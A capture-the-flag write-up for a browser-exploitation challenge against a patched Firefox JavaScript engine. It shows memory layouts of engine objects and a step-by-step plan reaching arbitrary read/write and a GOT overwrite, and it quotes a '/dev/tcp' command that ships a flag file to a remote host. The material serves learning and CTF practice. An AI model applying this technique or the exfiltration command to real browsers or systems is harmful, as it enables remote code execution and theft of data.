The challenge gives us an OOB read/write primitive from Arrays (see [patch](blaze.patch)), the newly added `blaze` method sets the length of any Array it's called on to 420. 

Recommended readings are:

* [Attacking JavaScript Engines](http://phrack.org/papers/attacking_javascript_engines.html)
* [Learning browser exploitation via 33C3 CTF feuerfuchs challenge](https://bruce30262.github.io/2017/12/15/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge)
* [feuerfuchs exploit by saleo](https://github.com/saelo/feuerfuchs/blob/master/exploit/pwn.js): I shamelessly appropriated the Int64 and memory classes from this


## Debugging environment

Since the libxul.so we were given is close to 2GB in size and gdb occasionally consumed a ton of memory when attached to the firefox process, I didn't feel like adding virtualization into the mix. Luckily the Dockerfile is based on Ubuntu 16.04, just like my desktop, though it shouldn't matter much besides the libc offsets. To get a somewhat decent debugging experience, I did the following:


* the challenge contains a Firefox profile that disables sandboxing. I also set the content process limit in the performance settings to 1, so that I don't have to mess too much with finding the right content process
* [modified](gdb.py) a gdb command to re-attach to the content process more easily
* checkout the source tree and compile it (so that generated source files are also available) according to the README, then `set substitute-path /home/ubuntu /ctf/blaze18/src` in gdb to get sources to display
* the only breakpoint I used was in the `blaze` function (`b Array.cpp:1602`)


## Messing around

After playing around a bit with the primitive, it seemed that we were only able to read and write NaN-boxed values, e.g. the integer 96 is represented as `0xfff8800000000060`. Then I allocated some Arrays, TypedArrays and ArrayBuffers and noticed that Arrays (with inline data) and TypedArrays were placed next to each other, while ArrayBuffers (with inline data) were allocated somewhere else. Let's examine how these objects look in memory.

### Arrays in memory

An empty Array looks like this:

```
00:0000│ rdx  0x7fcecfd05d48 —▸ 0x7fcec9157040 —▸ 0x7fcedeb252a0 (js::ArrayObject::class_) —▸ 0x7fcedcb4f29b ◂— ...
01:0008│      0x7fcecfd05d50 —▸ 0x7fcec91e3f90 —▸ 0x7fcecbe89f60 —▸ 0x7fcedeb252a0 (js::ArrayObject::class_) ◂— ...
02:0010│      0x7fcecfd05d58 ◂— 0x0
03:0018│      0x7fcecfd05d60 —▸ 0x7fcecfd05d78 ◂— 0x2f2f2f2f2f2f2f2f ('////////')   <-  `pointer to the elements`
04:0020│      0x7fcecfd05d68 ◂— 0x0
05:0028│      0x7fcecfd05d70 ◂— 0x6
06:0030│      0x7fcecfd05d78 ◂— 0x2f2f2f2f2f2f2f2f ('////////')
```

At offset 0x18 is the pointer to the actual data in the array. This points to right after the Array object since our Array is small (well, empty). I noted that the pointer isn't boxed, so it didn't seem possible to directly write to it via the primitive by placing two Arrays next to each other. Let's move on.


### ArrayBuffer

I created an ArrayBuffer with length 96 (from what I read this is the largest size with data still inlined) and filled it with the byte values from 0 to 96 through an Uint8array. The results is:

```
00:0000│   0x7fcec913d060 —▸ 0x7fcec919de50 —▸ 0x7fcedeb51480 (js::ArrayBufferObject::class_) —▸ 0x7fcedcad8971 ◂— ...
01:0008│   0x7fcec913d068 —▸ 0x7fcec9123970 —▸ 0x7fcecbe89fe0 —▸ 0x7fcedeb51480 (js::ArrayBufferObject::class_) ◂— ...
02:0010│   0x7fcec913d070 ◂— 0x0
03:0018│   0x7fcec913d078 —▸ 0x7fceddb0bda0 (emptyElementsHeader+16) ◂— add    byte ptr [rax], al
04:0020│   0x7fcec913d080 ◂— 0x3fe76489e850   <- `this is the shifted to the right by one pointer to the start of the actual buffer`
05:0028│   0x7fcec913d088 ◂— 0xfff8800000000060 /* '`' */  <- length of the ArrayBuffer
06:0030│   0x7fcec913d090 ◂— 0xfffe7fcecfd05848
07:0038│   0x7fcec913d098 ◂— 0xfff8800000000000
08:0040│   0x7fcec913d0a0 ◂— 0x706050403020100
09:0048│   0x7fcec913d0a8 ◂— 0xf0e0d0c0b0a0908
0a:0050│   0x7fcec913d0b0 ◂— 0x1716151413121110
0b:0058│   0x7fcec913d0b8 ◂— 0x1f1e1d1c1b1a1918
0c:0060│   0x7fcec913d0c0 ◂— 0x2726252423222120 (' !"#$%&\'')
0d:0068│   0x7fcec913d0c8 ◂— 0x2f2e2d2c2b2a2928 ('()*+,-./')
0e:0070│   0x7fcec913d0d0 ◂— 0x3736353433323130 ('01234567')
0f:0078│   0x7fcec913d0d8 ◂— 0x3f3e3d3c3b3a3938 ('89:;<=>?')
10:0080│   0x7fcec913d0e0 ◂— 0x4746454443424140 ('@ABCDEFG')
11:0088│   0x7fcec913d0e8 ◂— 0x4f4e4d4c4b4a4948 ('HIJKLMNO')
12:0090│   0x7fcec913d0f0 ◂— 0x5756555453525150 ('PQRSTUVW')
13:0098│   0x7fcec913d0f8 ◂— 'XYZ[\\]^_'
14:00a0│   0x7fcec913d100 ◂— 0x0
```

We can see what is likely the boxed length of the ArrayBuffer at offset 0x28. At offset 0x20 is another interesting member, the data pointer of the ArrayBuffer right-shifted by one. Also, of interest is the pointer into libxul at offset 0x18, which we will later leak.

```
pwndbg> p/x 0x3fe76489e850<<1
$1 = 0x7fcec913d0a0
```

Then, from 0x50 we can see the actual byte values. Since ArrayBuffers ended up very far from my Arrays, I moved on.


### TypedArrays

Creating an Uint8Array referencing the previous ArrayBuffer results in:

```
0c:0060│      0x7fcecfd05da8 —▸ 0x7fcec919dfd0 —▸ 0x7fcedeb5ce30 (js::TypedArrayObject::classes+48) —▸ 0x7fcedcad6202 ◂— ...
0d:0068│      0x7fcecfd05db0 —▸ 0x7fcec914a510 —▸ 0x7fcec91400a0 —▸ 0x7fcedeb5ce30 (js::TypedArrayObject::classes+48) ◂— ...
0e:0070│      0x7fcecfd05db8 ◂— 0x0
0f:0078│      0x7fcecfd05dc0 —▸ 0x7fceddb0bda0 (emptyElementsHeader+16) ◂— add    byte ptr [rax], al
10:0080│      0x7fcecfd05dc8 ◂— 0xfffe7fcec913d060						<-  `Nan-boxed pointer to the ArrayBuffer class`
11:0088│      0x7fcecfd05dd0 ◂— 0xfff8800000000060 /* '\`' */			<-  `AB length`
12:0090│      0x7fcecfd05dd8 ◂— 0xfff8800000000000						<- 	`offset?`
13:0098│      0x7fcecfd05de0 —▸ 0x7fcec913d0a0 ◂— 0x706050403020100		<-  `ptr to the actual beginning of the data in the AB, this is used in the set/get operations directly`
```

What's interesting to note is that TypedArrays cache the length and data pointer of the underlying ArrayBuffer. Also, the length is NaN-boxed, and the TypedArray ended up right next to our plain Array, from which we can trigger the OOB read/write. Meaning we can overwrite the cached length of the Uint8Array, effectively having OOB read/write relative to an ArrayBuffer, but without the restriction of only being able to manipulate boxed values.


So the plan is to:

* allocate two adjacent ArrayBuffers, both with sizes that result in inlined data
* allocate an empty Array and an Uint8Array that references the first ArrayBuffer, these end up far from the ArrayBuffers and need to be adjacent (the heap layout was very deterministic with regard to adjacency during testing).
* trigger `blaze` on the Array, so that we gain boxed r/w access to the Uint8Array
* enlarge the cached length of the Uint8Array, so that we can access the second ArrayBuffer through it
* leak the libxul pointer from the second ArrayBuffer through the Uint8Array
* achieve arbitrary r/w by modifying the data ptr and length of the second ArrayBuffer and creating a new TypedArray referencing it (and doing this every time we do a read or write)
* from here, I followed the route taken by saleo in his feuerfuchs exploit: replace the memmove .got entry in libxul with system, call copyWithin to trigger it with our controlled data and use `/bin/bash -c "cat /flag >/dev/tcp/IP/PORT"` to get the flag.


This worked great on my desktop, however, it failed when I spun up the docker container. According to the README, `/firefox/dist/bin/firefox --headless <url>` is the command used to run our exploit. In an attempt to find out what's happening, I launched firefox with the `-screenshot` flag, which is not, so surprisingly, supposed to take a screenshot of the website. What was surprising is that the exploit started working. Then I noticed that the docker build had some errors, my version of docker didn't support the --chown flag of ADD that was used in the Dockerfile. The end result was that the profile that disabled sandboxing wasn't copied over to the image and the exploit failed because of the sandbox (which the -screenshot flag disabled). After getting everything to work locally and receiving some help with the PoW from niklasb, it was time to light it up. 

All in all, a blaze to remember.

~The End~
